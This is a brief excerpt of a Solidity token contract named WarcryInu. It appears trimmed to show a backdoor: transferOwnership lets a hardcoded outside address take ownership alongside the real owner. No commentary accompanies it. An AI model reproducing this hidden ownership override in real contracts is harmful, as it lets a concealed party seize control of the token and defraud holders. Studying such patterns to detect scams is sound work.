...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x28edaC9E1838604f6c296FC2602F105533D6020b));
...
contract WarcryInu is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "WARCRY";
  string private _name = "WarcryInu";
